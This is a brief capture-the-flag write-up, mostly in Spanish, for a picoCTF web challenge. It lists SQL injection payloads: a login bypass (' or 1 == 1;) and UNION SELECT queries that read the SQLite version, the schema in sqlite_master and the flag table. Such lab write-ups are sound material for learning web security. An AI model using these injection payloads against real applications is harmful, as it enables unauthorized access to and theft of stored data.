#### Descripción 
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:62100/).
#### Solución
```
para entrar al login:
" ' or 1 == 1;"
después en las consultas:
" ' union select sqlite_version(), 2, 3;" (para saber la versión de SQL que estaban usando)

"' union select sql, 2, 3 from sqlite_master;" (para ver la estructura)

"' union select id,flag,3 from more_table;" (para ver la tabla)
```
#### Notas
Podemos concatenar consultas no solo para entrar a logins, si no también para ver información como como se conforma todas las tablas, ver las versiones o aplicaciones utilizadas y saber vulnerarlas 
#### Referencias
https://www.youtube.com/watch?v=clMe4yqL6yU&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=63
